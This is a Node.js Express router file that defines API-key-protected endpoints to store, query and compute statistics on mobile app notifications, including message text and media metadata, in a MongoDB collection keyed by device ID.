const express = require('express');
const router = express.Router();
const Notification = require('../models/Notification');
const { authenticateApiKey } = require('../middleware/auth');

// POST /api/notifications - Save notification
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            id,
            timestamp,
            packageName,
            appName,
            notificationId,
            tag,
            key,
            title,
            text,
            subText,
            bigText,
            summaryText,
            infoText,
            tickerText,
            completeMessage,
            category,
            priority,
            importance,
            groupKey,
            sortKey,
            channelId,
            actions,
            extras,
            flags,
            visibility,
            isOngoing,
            isClearable,
            isGroup,
            isGroupSummary,
            color,
            sound,
            vibrationPattern,
            person,
            conversationTitle,
            isGroupConversation,
            participantCount,
            postTime,
            whenTime,
            deviceId,
            hasMedia,
            mediaType,
            mediaUri,
            mediaFileName,
            mediaSize,
            mediaMimeType,
            mediaUploaded,
            mediaServerPath,
            mediaDownloadUrl
        } = req.body;

        // Validate required fields
        if (!id || !packageName || !appName || !notificationId || !key || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, packageName, appName, notificationId, key, deviceId'
            });
        }

        // Create notification data
        const notificationData = {
            id,
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            packageName,
            appName,
            notificationId,
            tag: tag || '',
            key,
            title: title || '',
            text: text || '',
            subText: subText || '',
            bigText: bigText || '',
            summaryText: summaryText || '',
            infoText: infoText || '',
            tickerText: tickerText || '',
            completeMessage: completeMessage || '',
            category: category || '',
            priority: priority || 0,
            importance: importance || 0,
            groupKey: groupKey || '',
            sortKey: sortKey || '',
            channelId: channelId || '',
            actions: actions || [],
            extras: extras || {},
            flags: flags || 0,
            visibility: visibility || 0,
            isOngoing: isOngoing || false,
            isClearable: isClearable !== undefined ? isClearable : true,
            isGroup: isGroup || false,
            isGroupSummary: isGroupSummary || false,
            color: color || 0,
            sound: sound || '',
            vibrationPattern: vibrationPattern || '',
            person: person || '',
            conversationTitle: conversationTitle || '',
            isGroupConversation: isGroupConversation || false,
            participantCount: participantCount || 0,
            postTime: postTime || 0,
            whenTime: whenTime || 0,
            deviceId,
            hasMedia: hasMedia || false,
            mediaType: mediaType || '',
            mediaUri: mediaUri || '',
            mediaFileName: mediaFileName || '',
            mediaSize: mediaSize || 0,
            mediaMimeType: mediaMimeType || '',
            mediaUploaded: mediaUploaded || false,
            mediaServerPath: mediaServerPath || '',
            mediaDownloadUrl: mediaDownloadUrl || '',
            updatedAt: new Date()
        };

        // Use findOneAndUpdate with upsert to prevent duplicates
        // Check for duplicates based on notificationId + packageName + deviceId
        const existingNotification = await Notification.findOneAndUpdate(
            { 
                notificationId: notificationId,
                packageName: packageName,
                deviceId: deviceId,
                tag: tag || null
            },
            notificationData,
            { 
                upsert: true, 
                new: true,
                setDefaultsOnInsert: true
            }
        );

        res.status(201).json({
            success: true,
            message: existingNotification.isNew ? 'Notification saved successfully' : 'Notification updated successfully',
            data: {
                id: existingNotification.id,
                timestamp: existingNotification.timestamp,
                packageName: existingNotification.packageName,
                appName: existingNotification.appName,
                title: existingNotification.title,
                deviceId: existingNotification.deviceId,
                isNew: existingNotification.isNew
            }
        });

    } catch (error) {
        console.error('Error saving notification:', error);
        
        if (error.code === 11000) {
            // Duplicate key error
            res.status(409).json({
                success: false,
                message: 'Notification with this ID already exists',
                duplicate: true
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'Internal server error',
                error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
            });
        }
    }
});

// GET /api/notifications - Fetch notifications
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            deviceId,
            packageName,
            limit = 100,
            offset = 0,
            startDate,
            endDate
        } = req.query;

        // Build query
        const query = {};
        
        if (deviceId) {
            query.deviceId = deviceId;
        }
        
        if (packageName) {
            query.packageName = packageName;
        }
        
        if (startDate || endDate) {
            query.timestamp = {};
            if (startDate) query.timestamp.$gte = new Date(startDate);
            if (endDate) query.timestamp.$lte = new Date(endDate);
        }

        // Execute query
        const notifications = await Notification.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .skip(parseInt(offset))
            .select('-__v');

        // Get total count for pagination
        const totalCount = await Notification.countDocuments(query);

        res.json({
            success: true,
            data: notifications,
            pagination: {
                total: totalCount,
                limit: parseInt(limit),
                offset: parseInt(offset),
                hasMore: (parseInt(offset) + notifications.length) < totalCount
            }
        });

    } catch (error) {
        console.error('Error fetching notifications:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
        });
    }
});

// GET /api/notifications/stats - Get notification statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName } = req.query;

        const matchQuery = {};
        if (deviceId) matchQuery.deviceId = deviceId;
        if (packageName) matchQuery.packageName = packageName;

        const stats = await Notification.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalNotifications: { $sum: 1 },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueDevices: { $addToSet: '$deviceId' }
                }
            },
            {
                $project: {
                    totalNotifications: 1,
                    uniqueAppsCount: { $size: '$uniqueApps' },
                    uniqueDevicesCount: { $size: '$uniqueDevices' },
                    uniqueApps: 1,
                    uniqueDevices: 1
                }
            }
        ]);

        const result = stats.length > 0 ? stats[0] : {
            totalNotifications: 0,
            uniqueAppsCount: 0,
            uniqueDevicesCount: 0,
            uniqueApps: [],
            uniqueDevices: []
        };

        res.json({
            success: true,
            data: result
        });

    } catch (error) {
        console.error('Error fetching notification stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
        });
    }
});

module.exports = router;
